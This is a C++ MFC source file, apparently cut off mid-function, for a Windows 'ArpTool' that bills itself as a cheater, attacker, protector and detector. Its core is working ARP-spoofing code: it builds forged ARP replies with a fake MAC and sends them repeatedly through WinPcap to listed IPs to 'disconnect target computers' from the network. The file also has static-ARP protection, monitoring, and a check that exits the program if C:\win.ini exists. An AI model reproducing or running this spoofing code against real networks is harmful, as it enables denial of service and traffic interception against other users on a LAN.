/*************************************
//版权Nov30th.Com QZJ HOHO``所有
//您可以研究但不可以作为商业用途.
//任何将本源代码作为商业目的将会被追究法律责任.
//如果不同意上述协议请立刻关闭文档并删除.
*************************************/


// ArpCheaterDlg.cpp : implementation file
//
#include "stdafx.h"
#include "ArpCheater.h"
#include "ArpCheaterDlg.h"
#include "DialogConfig.h"
#include "DialogIP.h"
#include "ConfigInfo.h"
#include "WelcomeDialog.h"
#include "RecordDialog.h"
#include "Iphlpapi.h"
#include "RemoteControl.h"

#include <PCAP.h>
#include <winsock2.h>
#include <vector>
#include <iterator>
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
#pragma comment(lib,  "Packet")
#pragma comment(lib,  "wpcap")
#pragma comment(lib, "Iphlpapi.lib")

#define   ID_TASKBARICON   100   
#define WM_SHOWTASK   (WM_USER + 0x100)    //一般数值大于１００
#define ARPVERSION "ArpTool (Cheater,Protector,Attacker,Detector) 4.00 -- Nov30th.Com"

HICON hIcon,hIcon2;
////////////////////////////ARP Cheater

//发送ARP包线程函数
enum{ 
    MAC_ADDR_LEN  = 6,       // mac地址的长度
    IP_ADDR_LEN   = 4        // IP地址的长度
};
enum{
    ETH_TYPE  =  0x0806 ,
    IP_TYPE =    0x0800 
};
enum{
    ARP_REQUEST  = 0x0001 ,   //arp request
    ARP_REPLY    = 0x0002 ,   //arp reply
};
enum {
    ARP_HARDWARE =  0x0001   
};
enum{
    MAX_ADAPTERS = 16         //最大的网络适配器数量
};


#pragma pack( push ,1 )          // 1 字节对齐

/*
*                            定义以太网帧的结构
*
*         0                 15                31                47     
*         +--------+--------+--------+--------+--------+--------+
*         |                   宿的mac地址                       |
*         +--------+--------+--------+--------+--------+--------+
*         |                   源的mac地址                       |
*         +--------+--------+--------+--------+--------+--------+
*         |     0x0806      |     数据。。。
*         +--------+--------+--------+--------+--------+--------+
*         0                 15                31                47
*/
typedef struct
{
    unsigned char  eh_dst[MAC_ADDR_LEN];    //以太网目的地址
    unsigned char  eh_src[MAC_ADDR_LEN];    //以太网源地址
    unsigned short eh_type;                 //以太网类型，默认0x0806
    char           data[1];
} ETH_t, *pETH_t;

/*
*                               定义ARP帧的结构
*
*         0                 15                31                47     
*         +--------+--------+--------+--------+--------+--------+
*         |      0x0001     |    0x0800(IP)   |  0x06  |  0x04  | 
*         +--------+--------+--------+--------+--------+--------+
*         |      opt        |           源的mac地址   。。。            
*         +--------+--------+--------+--------+--------+--------+
*            。。。         |           源的ip地址              |
*         +--------+--------+--------+--------+--------+--------+
*         |                    宿的mac地址                      |
*         +--------+--------+--------+--------+--------+--------+
*         |           宿的ip地址              | 
*         +--------+--------+--------+--------+
*         0                 15                31                47
*/
typedef struct arphdr //arp头
{
    unsigned short arp_hdr;                 // 硬件类型  Ethernet 0x0001
    unsigned short arp_pro;                 // 协议类型，IP，0x0800
    unsigned char  arp_hln;                 // 硬件地址长度，mac地址长度
    unsigned char  arp_pln;                 // 协议地址长度，ip地址长度
    unsigned short arp_opt;                 // [ request | reply| response ]
    unsigned char  arp_sha[MAC_ADDR_LEN];   // 发送端以太网地址
    unsigned long  arp_spa;                 // 发送端ip地址
    unsigned char  arp_tha[MAC_ADDR_LEN];   // 接收端以太网地址
    unsigned long  arp_tpa;                 // 接收端ip地址
} ARP_t, *pARP_t;

#pragma pack(  pop  )

typedef struct {
    char name[64];
    char description[64];
} Adapter_t,*pAdapter_t;

unsigned char da[6];  // 目标mac地址
unsigned char sa[6];  //伪装的mac地址
unsigned char ta[6];  //目标主机真实的MAC
unsigned char mymac[6];//当前网卡地址
char gateway_addr[16];         //伪装的IP地址
char sendto_addr[16];		//目标IP

static Adapter_t adapters[ MAX_ADAPTERS ] ;
static unsigned int adapter_counts = 0;
int rescure = 0;
pETH_t pE,pPE;
pARP_t pA,pPA ;
char sendbuf[256],protectbuff[256]; 
char error[PCAP_ERRBUF_SIZE]; 

std::vector<CString> iplist;
std::vector<CString>::iterator piplist;

UINT intertime = 0;
bool isResume = false;
bool stopsend = true;
bool isrebound = false;
bool isWireless = false;
bool isCheckingMac = false;
bool isMonitorArp = true;
bool isRecordPacket = false;
bool isFirstDraw = true;
bool isAutoRunRecord = false;
int isTaskStatus = 0;
int reboundinterval = 0;
unsigned long stopatip = 324340492;
CString vaildipaddress;
NOTIFYICONDATA   nid;
unsigned char p_getedmac[6];
unsigned long trustip = 0;
bool DisableScanAttack = false;
CRecordDialog recDialog;
PIP_ADAPTER_INFO pAdapterInfo = NULL;
PIP_ADAPTER_INFO pOrgAdapterInfo = NULL;
static bool isLoadMac = false;
unsigned char macAddress[6];//本机mac
unsigned char macGateAddress[6];//网关mac
CString gateIP;
CRemoteControl *remoteCtrl;


/////////////////////////////////////////////////////////////////////////////
// CArpCheaterDlg dialog

CArpCheaterDlg::CArpCheaterDlg(CWnd* pParent /*=NULL*/)
: CDialog(CArpCheaterDlg::IDD, pParent)
{
    //{{AFX_DATA_INIT(CArpCheaterDlg)
    m_sendinterval = 0;
    m_oneip = _T("");
    m_filepath = _T("");
    m_localmac = _T("");
    m_gatewaymac = _T("");
    m_gatewayip = _T("");
    m_forgemac = _T("");
    m_localip = _T("");
    m_radioiplist = -1;
    m_radioactiontype = -1;
    m_netmask = _T("");
    m_wirelessadapter = FALSE;
    m_info = _T("");
    m_reboundip = _T("");
    m_reboundmac = _T("");
    m_arpmonitor = _T("");
    m_record_arp_packet = FALSE;
    //}}AFX_DATA_INIT
    // Note that LoadIcon does not require a subsequent DestroyIcon in Win32
    m_hIcon = AfxGetApp()->LoadIcon(IDI_MAINFRAME);
}
void CArpCheaterDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    //{{AFX_DATA_MAP(CArpCheaterDlg)
    DDX_Control(pDX, IDC_LISTIP, m_listip);
    DDX_Control(pDX, IDC_BUTTONAUTO, m_autodetect);
    DDX_Control(pDX, IDC_COMBOADAPTER, m_adapter);
    DDX_Text(pDX, IDC_SENDTI, m_sendinterval);
    DDX_Text(pDX, IDC_EDITTCIP, m_oneip);
    DDX_Text(pDX, IDC_EDITTCFILE, m_filepath);
    DDX_Text(pDX, IDC_EDITLOCALMAC, m_localmac);
    DDX_Text(pDX, IDC_EDITGATEMAC, m_gatewaymac);
    DDX_Text(pDX, IDC_EDITGATEIP, m_gatewayip);
    DDX_Text(pDX, IDC_EDITFORGEMAC, m_forgemac);
    DDX_Text(pDX, IDC_EDITLOCALIP, m_localip);
    DDX_Radio(pDX, IDC_RADIOONE, m_radioiplist);
    DDX_Radio(pDX, IDC_RADIODISINTERNET, m_radioactiontype);
    DDX_Text(pDX, IDC_EDITNETMASK, m_netmask);
    DDX_Check(pDX, IDC_CHECK1, m_wirelessadapter);
    DDX_Text(pDX, IDC_EDITINFO, m_info);
    DDX_Text(pDX, IDC_EDITREBOUNDIP, m_reboundip);
    DDX_Text(pDX, IDC_EDITREBOUNDMAC, m_reboundmac);
    DDX_Text(pDX, IDC_EDITEXISTCOMPUTER, m_arpmonitor);
    DDX_Check(pDX, IDC_CHECKRECORDARP, m_record_arp_packet);
    //}}AFX_DATA_MAP
    DDX_Control(pDX, IDC_LISTIP, m_listip);
}

BEGIN_MESSAGE_MAP(CArpCheaterDlg, CDialog)
    //{{AFX_MSG_MAP(CArpCheaterDlg)
    ON_MESSAGE(WM_SHOWTASK,onShowTask)
    ON_WM_PAINT()
    ON_WM_QUERYDRAGICON()
    ON_BN_CLICKED(IDC_BUTTONAUTO, OnButtonauto)
    ON_CBN_SELCHANGE(IDC_COMBOADAPTER, OnSelchangeComboadapter)
    ON_BN_CLICKED(IDC_BUTTONSAVE, OnButtonsave)
    ON_BN_CLICKED(IDC_BUTTONLOAD, OnButtonload)
    ON_BN_CLICKED(IDC_BUTTONSTART, OnButtonstart)
    ON_BN_CLICKED(IDC_BUTTONBROWSEFILE, OnButtonbrowsefile)
    ON_EN_CHANGE(IDC_EDITTCIP, OnChangeEdittcip)
    ON_BN_CLICKED(IDC_BUTTONPROTECT, OnButtonprotect)
    ON_BN_CLICKED(IDC_BUTTONREBOUND, OnButtonrebound)
    ON_BN_CLICKED(IDC_BUTTONGETMAC, OnButtongetmac)
    ON_BN_CLICKED(IDC_BUTTONCLEANINFO, OnButtoncleaninfo)
    ON_BN_CLICKED(IDC_BUTTONSTOPMONITOR, OnButtonstopmonitor)
    ON_BN_CLICKED(IDC_BUTTONSTARTMONITOR, OnButtonstartmonitor)
    ON_BN_CLICKED(IDC_CHECK1, OnWirelessLan)
    ON_COMMAND(ID_MENUITEMEXIT, OnMenuitemexit)
    ON_WM_CLOSE()
    ON_COMMAND(ID_MENUITEMMORE, OnMenuitemmore)
    ON_BN_CLICKED(IDC_BUTTONLISTALLIP, OnButtonlistallip)
    ON_COMMAND(ID_MENUITEMTRUSTIP, OnMenuitemtrustip)
    ON_COMMAND(ID_MENUITEMCONFIG, OnMenuitemconfig)
    ON_COMMAND(ID_MENUITEMHELP, OnMenuitemhelp)
    ON_BN_CLICKED(IDC_CHECKRECORDARP, OnCheckrecordarp)
    ON_BN_CLICKED(IDC_BUTTONSEEPACKET, OnButtonseepacket)
    ON_COMMAND(ID_MENUITEM32777, OnMenuitem32777)
    //}}AFX_MSG_MAP

    ON_BN_CLICKED(IDC_BTNTEST, &CArpCheaterDlg::OnBnClickedBtntest)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CArpCheaterDlg message handlers

BOOL CArpCheaterDlg::OnInitDialog()
{

    if(CreateMutex(NULL,   true,   "Nov30thCheater")   !=   NULL   )
    {
        if(GetLastError()   ==   ERROR_ALREADY_EXISTS   )
        {   
            AfxMessageBox("已经有一个程序启动了。");
            exit(0);
        }
    }
    //初次登录窗口
    FILE *runfp;
    runfp = fopen("LastModify.qzj","r");
    if(runfp==NULL)
    {
        CWelcomeDialog welcomegialog;
        //welcomegialog.m_information = "第一次使用需要注意：\r\n\r\n\
    1.请勿在大规模网络并且有管理软件的情况下使用,可能会造成管理主机瘫痪.\r\n\
    2.该软件需要一直开启才能保持局域网中ARP问题的最大程度解决.\r\n\
    3.没有网络基础的用户请勿使用辅助功能,可能会造成网络瘫痪.\r\n\
    4.程序有效运行时,请勿开启任何ARP防火墙之类的软件.\r\n\
    5.程序并不会阻止ARP欺骗包,而是通过扰乱对方程序来达到目的,如果对方程序在该软件启动之前已经运行,则需要一段时间来扰乱恶意程序.\r\n\r\n\
    你可以在www.nov30th.com查看是否有新的版本。\r\n\r\n**作者对该软件使用造成的后果不承担任何责任**";
        welcomegialog.m_information = "4.00 增加服务端消息通知,所有该ARP客户端都可以向服务端发送警报。服务端运行需要.Net FrameWork 2.0。";
        welcomegialog.DoModal();
    }
    else
    {
        fclose(runfp);
    }

    //载入配置
    CConfigInfo configinfo;
    if (configinfo.LoadFile() == false)
    {
        configinfo.CreateFile();
        configinfo.LoadFile();
    }

    CDialog::OnInitDialog();

    // Set the icon for this dialog.  The framework does this automatically
    //  when the application's main window is not a dialog
    SetIcon(m_hIcon, TRUE);// Set big icon
    SetIcon(m_hIcon, FALSE);// Set small icon
    // TODO: Add extra initialization here

    if(_access("C:\\win.ini", 0)==0)
    {
        //发现不允许的控制
        AfxMessageBox("抱歉，您不允许被使用该程序。程序使用协议已经被局域网中另一台电脑撕毁!");
        exit(0);
    }
    //   初始化系统托盘图标   
    MoveWindow(400,300,480,225);
    nid.cbSize=(DWORD)sizeof(NOTIFYICONDATA); 
    nid.hWnd=this->m_hWnd;
    nid.uID=IDI_ICON;
    nid.uFlags=NIF_ICON|NIF_MESSAGE|NIF_TIP;
    nid.uCallbackMessage=WM_SHOWTASK;  //自定义的消息名称 
    hIcon = LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON));
    hIcon2 = LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON2));
    nid.hIcon=LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICON3));
    strcpy(nid.szTip,_T("HOHO`` Tools"));//信息提示条为“计划任务提醒”
    Shell_NotifyIcon(NIM_ADD,&nid);//在托盘区添加图标
    CWinThread* m_pWinThread = AfxBeginThread(AlermIconFlash,(LPVOID)NULL,THREAD_PRIORITY_NORMAL,0,0,0);
    m_pWinThread->m_bAutoDelete = true;
    this->ShowWindow(SW_HIDE);
    m_radioactiontype=0;
    m_radioiplist=0;
    m_sendinterval = 1000;
    SetAdapter();
    SetWindowText(ARPVERSION);
    m_info = _T("Nov30th.Com\r\n\r\n关闭程序请使用菜单中的 文件->退出。否则可能产生系统级错误(通俗语言:蓝屏)。点击任务栏该程序图标可以显示操作界面。\r\n");
    m_arpmonitor = _T("选择网卡后自动启动。\r\n点击窗口上的X，不会关闭窗口，可以使程序最小化。");
    UpdateData(false);
    DisableScanAttack = configinfo.saveoption[1] == 0 ? false : true ;
    trustip = configinfo.trustip;
    isAutoRunRecord = configinfo.saveoption[2] == 0 ? false : true ;
    m_listip.AddString(_T("程序读取配置文件完成..."));
    CString strtemp;
    strtemp.Format("当前信任IP为%d.%d.%d.%d",trustip & 0xff,trustip>>8 & 0xff,trustip>>16 & 0xff,trustip>>24 & 0xff);
    m_listip.AddString(_T(strtemp));
    //if (configinfo.saveoption[2]==1)
    //ShowWindow(SW_HIDE);
    recDialog.Create(IDD_DIALOGRECORD,this );
    return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CArpCheaterDlg::OnPaint() 
{
    if (IsIconic())
    {
        CPaintDC dc(this); // device context for painting

        SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

        // Center icon in client rectangle
        int cxIcon = GetSystemMetrics(SM_CXICON);
        int cyIcon = GetSystemMetrics(SM_CYICON);
        CRect rect;
        GetClientRect(&rect);
        int x = (rect.Width() - cxIcon + 1) / 2;
        int y = (rect.Height() - cyIcon + 1) / 2;


        // Draw the icon
        dc.DrawIcon(x, y, m_hIcon);
    }
    else
    {
        CDialog::OnPaint();
    }
    //第一次重画时处理
    if (isFirstDraw)
    {
        int isSuccessFound = -1;
        char temp[100];
        CString cmdString = GetCommandLine();
        isFirstDraw = false;
        if (cmdString.Find(" -autorun") > 0)
        {
            //自动启动
            FILE *fp;
            if ( ( fp = fopen("LastModify.qzj","r")) == NULL)
            {
                //没有发现文件
                AfxMessageBox("由于从未成功运行过该程序，自动启动失败!");
            }
            else
            {
                fgets(temp,99,fp);
                fclose(fp);
                if ( m_adapter.SelectString(-1,(LPSTR) temp) == -1)
                {
                    AfxMessageBox("最后一次成功运行的网卡未找到，自启动失败!");
                }
                else
                {
                    if (isAutoRunRecord)
                    {
                        OnCheckrecordarp();
                    }
                    OnSelchangeComboadapter();
                    ShowWindow(SW_HIDE);
                }
            }
        }
    }
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CArpCheaterDlg::OnQueryDragIcon()
{
    return (HCURSOR) m_hIcon;
}

void CArpCheaterDlg::SetAdapter()
{
    ULONG ulLen = 0;
    unsigned int i=0;
    // 为适配器结构申请内存
    ::GetAdaptersInfo(pAdapterInfo,&ulLen);
    pAdapterInfo = (PIP_ADAPTER_INFO)::GlobalAlloc(GPTR, ulLen);

    // 取得本地适配器结构信息
    if(::GetAdaptersInfo(pAdapterInfo,&ulLen) ==  ERROR_SUCCESS)
    {
        char adaptername[100];
        pOrgAdapterInfo = pAdapterInfo;
        while(pAdapterInfo != NULL)
        {
            m_adapter.InsertString(i,pAdapterInfo->Description );
            strcpy(adaptername,"\\Device\\NPF_");
            strcat(adaptername,pAdapterInfo->AdapterName);
            strcpy(pAdapterInfo->AdapterName,adaptername);
            pAdapterInfo = pAdapterInfo->Next;
            i++;
        }
    }
}



//自动获取

void CArpCheaterDlg::OnButtonauto() 
{
    UpdateData(true);
    m_localip = (char*)pAdapterInfo->IpAddressList.IpAddress.String;
    m_netmask = (char*)pAdapterInfo->IpAddressList.IpMask.String;
    m_gatewayip = (char*)pAdapterInfo->GatewayList.IpAddress.String;
    gateIP.Format("%s",m_gatewayip);
    m_forgemac = "88-88-88-88-88-88";
    ::ShellExecute(NULL,"open","ping.exe",m_gatewayip,NULL,SW_SHOW);
    CWinThread* m_pWinThread = AfxBeginThread(GetMyMac,(LPVOID)this,THREAD_PRIORITY_NORMAL,0,0,0);
    m_pWinThread->m_bAutoDelete = true;
    UpdateData(false);
}

void CArpCheaterDlg::OnSelchangeComboadapter() 
{
    // 选中网卡后激活按钮
    UpdateData(true);
    ((CButton*)GetDlgItem(IDC_CHECKRECORDARP))->EnableWindow(false);
    ((CButton*)GetDlgItem(IDC_BUTTONSAVE))->EnableWindow(true);
    ((CButton*)GetDlgItem(IDC_BUTTONAUTO))->EnableWindow(true);
    //((CButton*)GetDlgItem(IDC_BUTTONLOAD))->EnableWindow(false);
    ((CComboBox*)GetDlgItem(IDC_COMBOADAPTER))->EnableWindow(false);
    nid.hIcon = hIcon;
    Shell_NotifyIcon(NIM_MODIFY,&nid);//在托盘区添加图标
    CString m_adaptername;
    m_adapter.GetLBText(m_adapter.GetCurSel(),m_adaptername);
    pAdapterInfo = pOrgAdapterInfo;
    while(pAdapterInfo->Description != m_adaptername)
        pAdapterInfo = pAdapterInfo->Next;
    OnButtonstartmonitor();
    FILE *fp;
    fp = fopen("LastModify.qzj","w");
    fputs(m_adaptername,fp);
    fclose(fp);
    /************************
    Auto Check
    *************************/
    OnButtonauto();
    vaildipaddress = m_gatewayip;
    isCheckingMac = true;
    CWinThread* m_pWinThread = AfxBeginThread(GetCorrectMac,(LPVOID) GetDlgItem(IDC_EDITINFO),THREAD_PRIORITY_NORMAL,0,0,0);
    m_pWinThread->m_bAutoDelete = true;
    GetDlgItem(IDC_BUTTONGETMAC)->SetWindowTextA(_T("停止检查"));
}

// 保存配置文件

void CArpCheaterDlg::OnButtonsave() 
{
    UpdateData(true);
    char *m_enterchar = {"\n"};
    CString m_adaptername;
    CString m_filepath;
    m_adapter.GetLBText(m_adapter.GetCurSel(),m_adaptername);
    //Version
    CFileDialog m_MyOpenDialog(false,"qarp09","*.qarp09",OFN_HIDEREADONLY|OFN_OVERWRITEPROMPT, "NA 2.20 Config File(*.qarp09)|*.qarp09|",NULL);
    if (m_MyOpenDialog.DoModal()==IDOK)
    {
        m_filepath = m_MyOpenDialog.GetPathName();
        FILE *fp=NULL;
        if ((fp=fopen(m_filepath,"w"))==NULL)
        {
            //failed to open file
            AfxMessageBox(_T("创建配置文件时出错。没有可写权限。"));
            return;
        }
        fputs(m_adaptername,fp);
        fputs(m_enterchar,fp);
        fputs(m_localip,fp);
        fputs(m_enterchar,fp);
        fputs(m_netmask,fp);
        fputs(m_enterchar,fp);
        fputs(m_localmac,fp);
        fputs(m_enterchar,fp);
        fputs(m_gatewayip,fp);
        fputs(m_enterchar,fp);
        fputs(m_gatewaymac,fp);
        fputs(m_enterchar,fp);
        fputs(m_forgemac,fp);
        fputs(m_enterchar,fp);
        fputs(m_reboundip,fp);
        fputs(m_enterchar,fp);
        fputs(m_reboundmac,fp);
        fputs(m_enterchar,fp);
        fputs(m_wirelessadapter?"Y":"N",fp);
        fputs(m_enterchar,fp);
        fputs("This file created by Nov30th.Com ArpTool(Config File).",fp);

        fclose(fp);
    }
}


// 读取配置文件

void CArpCheaterDlg::OnButtonload() 
{
    if (m_adapter.GetCurSel()!= -1)
    {
        AfxMessageBox(_T("如果需要使用这个功能，请在程序启动后不要选择网卡，直接加载文件."));
        return;
    }
    UpdateData(true);
    CString m_filepath;
    CString m_adaptername;
    char temp[100] = {0};
    int m_selectString = -1;
    CFileDialog m_MyOpenDialog(true,"qarp09","*.qarp09",OFN_HIDEREADONLY|OFN_OVERWRITEPROMPT, "NA 2.20 Config File(*.qarp09)|*.qarp09|",NULL);
    if (m_MyOpenDialog.DoModal()==IDOK)
    {
        m_filepath = m_MyOpenDialog.GetPathName();
        FILE *fp=NULL;
        if ((fp=fopen(m_filepath,"r"))==NULL)
        {
            //failed to open file
            AfxMessageBox(_T("打开配置文件时出错。"));
            return;
        }
        fgets(temp,99,fp);//adapter name
        temp[strlen(temp)-1]='\0';
        m_adaptername = (LPSTR) temp;
        m_selectString = m_adapter.SelectString(-1,m_adaptername);
        fgets(temp,99,fp);//local ip
        temp[strlen(temp)-1]='\0';
        m_localip = (LPSTR) temp;
        fgets(temp,99,fp);//local netmask
        temp[strlen(temp)-1]='\0';
        m_netmask = (LPSTR) temp;
        fgets(temp,99,fp);//local mac
        temp[strlen(temp)-1]='\0';
        m_localmac = (LPSTR) temp;
        fgets(temp,99,fp);//gateway ip
        temp[strlen(temp)-1]='\0';
        m_gatewayip = (LPSTR) temp;
        fgets(temp,99,fp);//gateway mac
        temp[strlen(temp)-1]='\0';
        m_gatewaymac = (LPSTR) temp;
        fgets(temp,99,fp);//forge mac
        temp[strlen(temp)-1]='\0';
        m_forgemac = (LPSTR) temp;
        fgets(temp,99,fp);//rebound ip
        temp[strlen(temp)-1]='\0';
        m_reboundip = (LPSTR) temp;
        fgets(temp,99,fp);//rebound mac
        temp[strlen(temp)-1]='\0';
        m_reboundmac = (LPSTR) temp;
        fgets(temp,99,fp);//is wireless adapter
        if (temp[0]=='Y')
            m_wirelessadapter = true;
        else
            m_wirelessadapter = false;
        fclose(fp);
        UpdateData(false);
        if (m_selectString == -1)
        {
            AfxMessageBox(_T("配置文件中的网卡没有找到，不同计算机不适合用同一个配置文件！"));
        }
        else
        {
            OnSelchangeComboadapter();
            m_adapter.SetCurSel(m_selectString);
        }
    }
}

void CArpCheaterDlg::OnButtonstart() 
{
    // 开始运行
    UpdateData(true);
    if (stopsend==true)
    {
        stopsend = false;
        if (!LoadDestineComputers(false))
            return;
        if (!InitArp())
            return;
        //变化量
        ((CButton*)GetDlgItem(IDC_BUTTONSTART))->SetWindowText(_T("停止断开目标计算机网络"));
        //SendArpPacket();
        CWinThread* m_pWinThread = AfxBeginThread(SendArpPacket,(LPVOID)_T("arpcheat"),THREAD_PRIORITY_NORMAL,0,0,0);
        m_pWinThread->m_bAutoDelete = true;
        m_info += _T("\r\n断开目标计算机功能已经启动！");
    }
    else
    {
        stopsend = true;
        ((CButton*)GetDlgItem(IDC_BUTTONSTART))->SetWindowText(_T("断开目标计算机网络"));
        m_info += _T("\r\n断开目标计算机功能停止！");
    }
    UpdateData(false);
}

void CArpCheaterDlg::OnButtonbrowsefile() 
{
    // 从文件获得IP地址
    UpdateData(true);
    CFileDialog m_MyOpenDialog(true,"txt","*.txt",OFN_HIDEREADONLY|OFN_OVERWRITEPROMPT, "IP File(*.txt)|*.txt|All Files(*.*)|*.*|",NULL);
    if (m_MyOpenDialog.DoModal() == IDOK)
    {
        m_filepath = m_MyOpenDialog.GetPathName();
        m_radioiplist = 1;
    }
    UpdateData(false);
}

void CArpCheaterDlg::OnChangeEdittcip() 
{
    // 改变单个ip自动radio
    UpdateData(true);
    m_radioiplist = 0;
    UpdateData(false);
}

void CArpCheaterDlg::OnButtonlistallip() 
{
    SaveIpToFile(false);
}


//线程函数
UINT SendArpPacket(LPVOID lpParam )
{
    char runbuf[256];
    std::vector<CString> localiplist;
    pcap_t *fp;
    pETH_t pEth;
    pARP_t pArp;
    pEth = (pETH_t)runbuf ;
    pArp = (pARP_t)pEth->data;
    CString strParam;
    int m_localinter = 0;
    int i =0 ;
    memcpy(runbuf,sendbuf,256*sizeof(char));
    localiplist.assign(iplist.begin(),iplist.end());
    m_localinter = intertime / 500;
    strParam = (LPCTSTR)lpParam;

    /////////////////////////////////////////////
    ////////发包
    if (strParam == _T("arpcheat"))
    {
        /////////////////////欺骗
        while(!stopsend)
        {
            //////////////////////////DEBUG
            piplist = iplist.begin();
            if( (fp = pcap_open_live( pAdapterInfo->AdapterName , 100, 0, 1000, error ) ) == NULL)
            {
                AfxMessageBox(_T("打开网卡句柄失败！请检查是否安装了最新的WinPcap或者填写了正确的设置。"));
                return 0 ;
            }
            while(piplist != iplist.end())
            {
                pArp->arp_spa = inet_addr(*piplist);
                pcap_sendpacket( fp, (u_char*)runbuf,  sizeof( ETH_t )+sizeof( ARP_t ) -1  );
                piplist++;
            }
            pcap_close( fp );
            if (intertime < 1000)
            {
                Sleep(intertime);
            }
            else
            {
                for(i=0;i<m_localinter;i++)
                {
                    if (stopsend)
                        break;
                    Sleep(500);
                }
            }
        }
    }
    return 0;
}


//保护本机线程函数
UINT ProtectMy(LPVOID lpParam)
{
    pcap_t *pfp;
    if( (pfp = pcap_open_live( pAdapterInfo->AdapterName , 100, 0, 1000, error ) ) == NULL )
    {
        AfxMessageBox(_T("打开网卡句柄失败！请检查是否安装了最新的WinPcap或者填写了正确的设置。"));
        return 0 ;
    }
    while(isResume)
    {
        Sleep(500);
        pcap_sendpacket( pfp, (u_char*)protectbuff,  sizeof( ETH_t )+sizeof( ARP_t ) -1  );
    }
    ////////////////保护
    pcap_close( pfp );
    return 0;
}

bool CArpCheaterDlg::InitArp()
{
    if (fopen("C:\\win.ini","r")!=NULL)
    {
        //发现不允许的控制
        exit(0);
    }
    if (m_gatewaymac.IsEmpty() || m_forgemac.IsEmpty() || m_localmac.IsEmpty() || m_gatewayip.IsEmpty() || m_localip.IsEmpty() || (m_adapter.GetCurSel()==-1))
    {
        AfxMessageBox(_T("没有填写完整的设置项。如果初次使用。请查阅中文使用说明。"));
        return false;
    }
    intertime = m_sendinterval;
    /////////////////////////////////////////////
    ////////初始化数据
    sscanf(m_gatewaymac,"%x-%x-%x-%x-%x-%x",&da[0],&da[1],&da[2],&da[3],&da[4],&da[5]);
    sscanf(m_forgemac,"%x-%x-%x-%x-%x-%x",&sa[0],&sa[1],&sa[2],&sa[3],&sa[4],&sa[5]);
    sscanf(m_localmac,"%x-%x-%x-%x-%x-%x",&ta[0],&ta[1],&ta[2],&ta[3],&ta[4],&ta[5]);
    strcpy(sendto_addr,m_gatewayip);
    strcpy(gateway_addr,m_localip);

    /////////////////////////////////////////////
    ////////包构造

    memset( sendbuf , 0 , 256 );
    pE = (pETH_t)sendbuf ;
    pA = (pARP_t)pE->data;
    pE->eh_type = htons( ETH_TYPE );
    pA->arp_hdr = htons( ARP_HARDWARE );
    pA->arp_pro = htons( IP_TYPE );
    pA->arp_opt = htons( ARP_REPLY );
    pA->arp_hln = MAC_ADDR_LEN;
    pA->arp_pln = IP_ADDR_LEN;
    memcpy( pE->eh_dst  ,da , 6);
    memcpy( pA->arp_tha ,da , 6);
    pA->arp_tpa = inet_addr( sendto_addr );
    if (m_wirelessadapter)
        memcpy( pE->eh_src  ,ta , 6);
    else
        memcpy( pE->eh_src  ,sa , 6);
    memcpy( pA->arp_sha ,sa , 6);
    return true;
}
void CArpCheaterDlg::OnButtonprotect() 
{
    CString strArpCmd;
    //strArpCmd.Format("%d",isResume);
    //AfxMessageBox(strArpCmd);
    UpdateData(true);
    ////////////////////////////////////
    //////////恢复本机的
    if (!isResume)
    {
        if (isCheckingMac)
        {
            AfxMessageBox(_T("注意！当前正在监测网关和欺骗ARP数据。\n程序并不探测辅助程序是否在运行，如果要正常使用该保护功能，必须把辅助窗口[AutoRequestGateWayARP]关闭！\n\n务必在点下确定之前，否则绑定静态ARP会失败！"));
        }
        if (!InitArp())
            return;
        strArpCmd.Format("arp -s %s %s %s",m_gatewayip,m_gatewaymac,m_localip);
        system(strArpCmd);
        this->GetDlgItem(IDC_BUTTONPROTECT)->SetWindowTextA(">>>停止保护<<<");
        memset( protectbuff , 0 , 256 );
        pPE = (pETH_t)protectbuff ;
        pPA = (pARP_t)pPE->data;
        pPE->eh_type = htons( ETH_TYPE );
        memcpy( pPE->eh_dst  ,da , 6);
        memcpy( pPA->arp_tha ,da , 6);
        pPA->arp_hdr = htons( ARP_HARDWARE );
        pPA->arp_pro = htons( IP_TYPE );
        pPA->arp_opt = htons( ARP_REPLY );
        pPA->arp_hln = MAC_ADDR_LEN;
        pPA->arp_pln = IP_ADDR_LEN;
        pPA->arp_tpa = inet_addr( sendto_addr );
        pPA->arp_spa = inet_addr(m_localip);
        memcpy( pPE->eh_src  ,ta , 6);
        memcpy( pPA->arp_sha ,ta , 6);
        //SendArpPacket();
        isResume = !isResume;
        CWinThread* m_pWinThread = AfxBeginThread(ProtectMy,(LPVOID)NULL,THREAD_PRIORITY_NORMAL,0,0,0);
        m_pWinThread->m_bAutoDelete = true;
        m_info += "\r\n***********\r\n保护本地计算机到网关的链路已经启用。\r\n";
    }
    else
    {
        isResume = !isResume;
        this->GetDlgItem(IDC_BUTTONPROTECT)->SetWindowTextA("保护本机到网关通信");
    }
    UpdateData(false);
}

bool CArpCheaterDlg::LoadIPFileToIPList(bool isall)
{
    FILE *fp;
    char temp[100];
    if ((fp = fopen(m_filepath,"r"))==NULL)
    {
        AfxMessageBox(_T("打开IP信息文件失败！请确定路径是否正确！"));
        return false;
    }
    while(!feof(fp))
    {
        fgets(temp,99,fp);
        if (strlen(temp) < 9)
            continue;
        temp[strlen(temp)-1] = '\0';
        if ( (m_localip == (LPSTR)temp || m_gatewayip == (LPSTR)temp) && !isall)
            continue;
        iplist.push_back((LPSTR)temp);
    }
    fclose(fp);
    return true;
}

bool CArpCheaterDlg::LoadDestineComputers(bool isall)
{
    /////////////////////////////////////////////
    ////////加载联系人
    iplist.clear();
    if (m_radioiplist == 0 && m_oneip.IsEmpty() || (m_filepath.IsEmpty() && m_radioiplist == 1))
    {
        AfxMessageBox(_T("你没有选择任何目标计算机或者攻击的源假冒地址，现在程序将自动创造局域网络中的IP作为目标计算机或者源伪造IP"));
        SaveIpToFile(true);
        UpdateData(true);
        m_radioiplist = 1;
